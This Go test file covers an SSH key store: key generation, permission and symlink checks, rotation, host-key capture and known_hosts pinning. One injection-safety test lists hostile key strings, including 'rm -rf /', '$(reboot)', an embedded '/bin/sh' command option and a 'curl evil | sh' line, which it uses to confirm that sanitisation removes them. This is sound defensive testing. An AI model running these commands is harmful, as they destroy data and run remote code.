package nodes

import (
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"testing"

	"golang.org/x/crypto/ssh"
)

// fakeSSHServer is an in-process SSH server: it only presents a host key and
// rejects every authentication attempt. It records whether auth was tried.
type fakeSSHServer struct {
	ln        net.Listener
	host      string
	port      int
	mu        sync.Mutex
	signer    ssh.Signer
	authTried chan struct{}
}

func newSigner(t *testing.T) ssh.Signer {
	t.Helper()
	_, sk, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	sg, err := ssh.NewSignerFromKey(sk)
	if err != nil {
		t.Fatal(err)
	}
	return sg
}

func startFakeSSH(t *testing.T) *fakeSSHServer {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	f := &fakeSSHServer{ln: ln, signer: newSigner(t), authTried: make(chan struct{}, 16)}
	h, p, _ := net.SplitHostPort(ln.Addr().String())
	f.host = h
	f.port, _ = strconv.Atoi(p)
	t.Cleanup(func() { _ = ln.Close() })
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			go func(c net.Conn) {
				defer c.Close()
				cfg := &ssh.ServerConfig{
					PasswordCallback: func(ssh.ConnMetadata, []byte) (*ssh.Permissions, error) {
						f.authTried <- struct{}{}
						return nil, os.ErrPermission
					},
					PublicKeyCallback: func(ssh.ConnMetadata, ssh.PublicKey) (*ssh.Permissions, error) {
						f.authTried <- struct{}{}
						return nil, os.ErrPermission
					},
				}
				cfg.AddHostKey(f.currentSigner())
				_, _, _, _ = ssh.NewServerConn(c, cfg)
			}(c)
		}
	}()
	return f
}

func (f *fakeSSHServer) currentSigner() ssh.Signer {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.signer
}
func (f *fakeSSHServer) setSigner(s ssh.Signer) {
	f.mu.Lock()
	f.signer = s
	f.mu.Unlock()
}
func (f *fakeSSHServer) fingerprint() string {
	return ssh.FingerprintSHA256(f.currentSigner().PublicKey())
}

func TestSSHKeyStoreGenerateAndPermissions(t *testing.T) {
	dir := t.TempDir()
	s := NewSSHKeyStore(dir)
	info, err := s.Info()
	if err != nil || info.Configured {
		t.Fatalf("fresh store: %+v %v", info, err)
	}
	info, err = s.Generate()
	if err != nil {
		t.Fatal(err)
	}
	if !info.Configured || info.Algorithm != "ssh-ed25519" || !strings.HasPrefix(info.Fingerprint, "SHA256:") ||
		!strings.Contains(info.PublicKey, " webkvm-cluster-") || info.CreatedAt.IsZero() {
		t.Fatalf("info = %+v", info)
	}
	for name, perm := range map[string]os.FileMode{"": 0o700, "id_ed25519": 0o600, "id_ed25519.pub": 0o644, "meta.json": 0o600} {
		st, err := os.Lstat(filepath.Join(dir, "cluster-ssh", name))
		if err != nil || st.Mode().Perm() != perm {
			t.Errorf("%q: mode %v err %v, want %v", name, st.Mode().Perm(), err, perm)
		}
	}
	raw, _ := os.ReadFile(s.KeyPath())
	sg, err := ssh.ParsePrivateKey(raw)
	if err != nil {
		t.Fatalf("private key not parseable: %v", err)
	}
	if ssh.FingerprintSHA256(sg.PublicKey()) != info.Fingerprint {
		t.Fatal("public/private key mismatch")
	}
	if strings.Contains(info.PublicKey, "PRIVATE") {
		t.Fatal("info leaks private material")
	}
	if _, err := s.Generate(); err != ErrKeyExists {
		t.Fatalf("second Generate err = %v", err)
	}
}

func TestSSHKeyStoreRejectsUnsafeDirAndFiles(t *testing.T) {
	dir := t.TempDir()
	s := NewSSHKeyStore(dir)
	if _, err := s.Generate(); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(s.KeyPath(), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := s.Info(); err == nil {
		t.Fatal("world-readable private key accepted")
	}
	_ = os.Chmod(s.KeyPath(), 0o600)
	if err := os.Chmod(filepath.Join(dir, "cluster-ssh"), 0o755); err != nil {
		t.Fatal(err)
	}
	if _, err := s.Info(); err == nil {
		t.Fatal("unsafe directory accepted")
	}

	// A symlinked store directory is never followed.
	dir2 := t.TempDir()
	real := filepath.Join(dir2, "elsewhere")
	if err := os.Mkdir(real, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(real, filepath.Join(dir2, "cluster-ssh")); err != nil {
		t.Fatal(err)
	}
	s2 := NewSSHKeyStore(dir2)
	if _, err := s2.Generate(); err == nil {
		t.Fatal("Generate followed a symlinked directory")
	}
	if entries, _ := os.ReadDir(real); len(entries) != 0 {
		t.Fatalf("files written through symlink: %v", entries)
	}

	// A symlinked key file is rejected.
	dir3 := t.TempDir()
	s3 := NewSSHKeyStore(dir3)
	if _, err := s3.Generate(); err != nil {
		t.Fatal(err)
	}
	moved := filepath.Join(dir3, "moved")
	if err := os.Rename(s3.KeyPath(), moved); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(moved, s3.KeyPath()); err != nil {
		t.Fatal(err)
	}
	if _, err := s3.Info(); err == nil {
		t.Fatal("symlinked private key accepted")
	}
}

func TestSSHKeyRotation(t *testing.T) {
	s := NewSSHKeyStore(t.TempDir())
	if err := s.CommitRotation(); err != ErrNoPending {
		t.Fatalf("commit without store: %v", err)
	}
	if _, err := s.StartRotation(); err != ErrNoKey {
		t.Fatalf("rotate without key: %v", err)
	}
	orig, _ := s.Generate()
	if err := s.AbortRotation(); err != ErrNoPending {
		t.Fatalf("abort without pending: %v", err)
	}
	p, err := s.StartRotation()
	if err != nil {
		t.Fatal(err)
	}
	info, _ := s.Info()
	if info.Fingerprint != orig.Fingerprint || info.Pending == nil || info.Pending.Fingerprint != p.Fingerprint || p.Fingerprint == orig.Fingerprint {
		t.Fatalf("pending must not replace the active key: %+v", info)
	}
	if err := s.AbortRotation(); err != nil {
		t.Fatal(err)
	}
	if info, _ = s.Info(); info.Pending != nil || info.Fingerprint != orig.Fingerprint {
		t.Fatalf("after abort: %+v", info)
	}
	p, _ = s.StartRotation()
	if err := s.CommitRotation(); err != nil {
		t.Fatal(err)
	}
	info, err = s.Info()
	if err != nil || info.Fingerprint != p.Fingerprint || info.Pending != nil || info.PublicKey != p.PublicKey {
		t.Fatalf("after commit: %+v %v", info, err)
	}
	raw, _ := os.ReadFile(s.KeyPath())
	sg, err := ssh.ParsePrivateKey(raw)
	if err != nil || ssh.FingerprintSHA256(sg.PublicKey()) != p.Fingerprint {
		t.Fatalf("active private key is not the rotated one: %v", err)
	}
	if st, _ := os.Lstat(s.KeyPath()); st.Mode().Perm() != 0o600 {
		t.Fatalf("rotated key mode %v", st.Mode().Perm())
	}
	if err := s.CommitRotation(); err != ErrNoPending {
		t.Fatalf("second commit: %v", err)
	}
}

func TestAuthorizedKeysLineAndCommandAreInjectionSafe(t *testing.T) {
	const prefix = `restrict,port-forwarding,permitopen="127.0.0.1:*" `
	good := "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIabc webkvm-cluster-1a2b"
	if got := AuthorizedKeysLine(good); got != prefix+good {
		t.Fatalf("line = %q", got)
	}
	hostile := []string{
		"ssh-ed25519 AAAA' ; rm -rf / ; echo '",
		"ssh-ed25519 AAAA comment\nssh-rsa EVIL attacker",
		"ssh-ed25519 AAAA $(reboot) `id` \"x\" \\ ; | & > <",
		"ssh-ed25519\tAAAA\r\ncommand=\"/bin/sh\" ssh-rsa BBBB",
		"'; curl evil | sh #",
	}
	for _, pub := range hostile {
		line := AuthorizedKeysLine(pub)
		rest := strings.TrimPrefix(line, prefix)
		if line != "" && rest == line {
			t.Errorf("%q: missing restriction prefix: %q", pub, line)
		}
		if strings.ContainsAny(rest, "'\"`$;|&<>\n\r\t()#"+string(rune(92))) {
			t.Errorf("%q: unsafe characters survive: %q", pub, rest)
		}
		if n := len(strings.Fields(rest)); n > 3 {
			t.Errorf("%q: %d fields in key part: %q", pub, n, rest)
		}
		cmd := AuthorizeCommandForKey(pub)
		if strings.ContainsAny(cmd, "\n\r`$") {
			t.Errorf("%q: command has unsafe characters: %q", pub, cmd)
		}
		// Exactly two quoted arguments, i.e. four single quotes.
		if cmd != "" && strings.Count(cmd, "'") != 4 {
			t.Errorf("%q: quoting broken: %q", pub, cmd)
		}
	}
	if got := shellQuote("a'b"); got != `'a'\''b'` {
		t.Fatalf("shellQuote = %q", got)
	}

	s := NewSSHKeyStore(t.TempDir())
	if s.AuthorizeCommand("root") != "" {
		t.Fatal("command without a key")
	}
	info, _ := s.Generate()
	cmd := s.AuthorizeCommand("root")
	want := AuthorizedKeysLine(info.PublicKey)
	if !strings.HasPrefix(cmd, "install -d -m 700 ~/.ssh && ") || strings.Count(cmd, "'"+want+"'") != 2 ||
		!strings.HasSuffix(cmd, "chmod 600 ~/.ssh/authorized_keys") || !strings.Contains(cmd, "grep -qxF -- ") {
		t.Fatalf("cmd = %q", cmd)
	}
	for _, u := range []string{"", "ro ot", "a;b", "$(id)", "-x"} {
		if s.AuthorizeCommand(u) != "" {
			t.Errorf("user %q accepted", u)
		}
	}
}

func TestCaptureHostKeyNeverAuthenticates(t *testing.T) {
	srv := startFakeSSH(t)
	s := NewSSHKeyStore(t.TempDir())
	hk, err := s.CaptureHostKey(context.Background(), srv.host, srv.port)
	if err != nil {
		t.Fatal(err)
	}
	if hk.Fingerprint != srv.fingerprint() || hk.Type != "ssh-ed25519" || len(hk.Raw) == 0 {
		t.Fatalf("hk = %+v", hk)
	}
	select {
	case <-srv.authTried:
		t.Fatal("capture attempted to authenticate")
	default:
	}
	// Capturing pins nothing.
	if _, ok := s.PinnedHostKey(srv.host, srv.port); ok {
		t.Fatal("capture pinned the key")
	}
}

func TestCaptureHostKeyUnreachableAndTimeout(t *testing.T) {
	ln, _ := net.Listen("tcp", "127.0.0.1:0")
	_, p, _ := net.SplitHostPort(ln.Addr().String())
	port, _ := strconv.Atoi(p)
	_ = ln.Close()
	s := NewSSHKeyStore(t.TempDir())
	if _, err := s.CaptureHostKey(context.Background(), "127.0.0.1", port); err != ErrHostUnreachable {
		t.Fatalf("closed port err = %v", err)
	}
	for _, h := range []string{"", "a b", "h/x", "u@h"} {
		if _, err := s.CaptureHostKey(context.Background(), h, 22); err != ErrHostUnreachable {
			t.Errorf("host %q err = %v", h, err)
		}
	}
	// A server that accepts but never speaks SSH: bounded by the context.
	silent, _ := net.Listen("tcp", "127.0.0.1:0")
	defer silent.Close()
	go func() {
		for {
			c, err := silent.Accept()
			if err != nil {
				return
			}
			defer c.Close()
		}
	}()
	_, sp, _ := net.SplitHostPort(silent.Addr().String())
	sport, _ := strconv.Atoi(sp)
	ctx, cancel := context.WithTimeout(context.Background(), 200e6)
	defer cancel()
	if _, err := s.CaptureHostKey(ctx, "127.0.0.1", sport); err != ErrHostTimeout {
		t.Fatalf("silent server err = %v", err)
	}
}

func TestPinHostKeyTOFU(t *testing.T) {
	srv := startFakeSSH(t)
	s := NewSSHKeyStore(t.TempDir())
	if st, fp := s.HostKeyState(srv.host, srv.port); st != HostKeyUnknown || fp != srv.fingerprint() {
		t.Fatalf("state before pin = %s %s", st, fp)
	}
	if err := s.PinHostKey(srv.host, srv.port, "SHA256:not-what-the-operator-saw", false); err != ErrFingerprintMismatch {
		t.Fatalf("mismatch err = %v", err)
	}
	if _, ok := s.PinnedHostKey(srv.host, srv.port); ok {
		t.Fatal("pinned despite mismatch")
	}
	if err := s.PinHostKey(srv.host, srv.port, srv.fingerprint(), false); err != nil {
		t.Fatal(err)
	}
	raw, _ := os.ReadFile(s.KnownHostsPath())
	wantPrefix := "[" + srv.host + "]:" + strconv.Itoa(srv.port) + " ssh-ed25519 "
	if !strings.HasPrefix(string(raw), wantPrefix) || strings.Count(string(raw), "\n") != 1 {
		t.Fatalf("known_hosts = %q", raw)
	}
	if st, _ := os.Lstat(s.KnownHostsPath()); st.Mode().Perm() != 0o600 {
		t.Fatalf("known_hosts mode %v", st.Mode().Perm())
	}
	// The line must be valid for a real known_hosts parser.
	_, hosts, pk, _, _, err := ssh.ParseKnownHosts(raw)
	if err != nil || len(hosts) != 1 || ssh.FingerprintSHA256(pk) != srv.fingerprint() {
		t.Fatalf("known_hosts not parseable: %v %v", hosts, err)
	}
	// Idempotent.
	if err := s.PinHostKey(srv.host, srv.port, srv.fingerprint(), false); err != nil {
		t.Fatal(err)
	}
	if again, _ := os.ReadFile(s.KnownHostsPath()); string(again) != string(raw) {
		t.Fatalf("re-pin changed the file: %q", again)
	}
	if st, fp := s.HostKeyState(srv.host, srv.port); st != HostKeyPinned || fp != srv.fingerprint() {
		t.Fatalf("state = %s %s", st, fp)
	}

	// The server now presents another key.
	old := srv.fingerprint()
	srv.setSigner(newSigner(t))
	if st, fp := s.HostKeyState(srv.host, srv.port); st != HostKeyChanged || fp != srv.fingerprint() {
		t.Fatalf("state after change = %s %s", st, fp)
	}
	if err := s.PinHostKey(srv.host, srv.port, srv.fingerprint(), false); err != ErrHostKeyChanged {
		t.Fatalf("overwrite without replace err = %v", err)
	}
	if fp, _ := s.PinnedHostKey(srv.host, srv.port); fp != old {
		t.Fatal("pinned key was overwritten without replace")
	}
	if err := s.PinHostKey(srv.host, srv.port, srv.fingerprint(), true); err != nil {
		t.Fatal(err)
	}
	if fp, _ := s.PinnedHostKey(srv.host, srv.port); fp != srv.fingerprint() {
		t.Fatal("replace did not pin the new key")
	}
	if raw, _ := os.ReadFile(s.KnownHostsPath()); strings.Count(string(raw), "\n") != 1 {
		t.Fatalf("old line kept: %q", raw)
	}
}

func TestKnownHostsKeepsOtherHostsAndRemoves(t *testing.T) {
	a, b := startFakeSSH(t), startFakeSSH(t)
	s := NewSSHKeyStore(t.TempDir())
	for _, srv := range []*fakeSSHServer{a, b} {
		if err := s.PinHostKey(srv.host, srv.port, srv.fingerprint(), false); err != nil {
			t.Fatal(err)
		}
	}
	if err := s.RemoveHostKey(a.host, a.port); err != nil {
		t.Fatal(err)
	}
	if _, ok := s.PinnedHostKey(a.host, a.port); ok {
		t.Fatal("a still pinned")
	}
	if fp, ok := s.PinnedHostKey(b.host, b.port); !ok || fp != b.fingerprint() {
		t.Fatal("b lost")
	}
	if err := s.RemoveHostKey("never-pinned.example", 22); err != nil {
		t.Fatal(err)
	}
	if err := NewSSHKeyStore(t.TempDir()).RemoveHostKey("x.example", 22); err != nil {
		t.Fatal(err)
	}
	if knownHostsName("h.example", 22) != "h.example" || knownHostsName("::1", 2222) != "[::1]:2222" {
		t.Fatal("known_hosts host token format")
	}
}
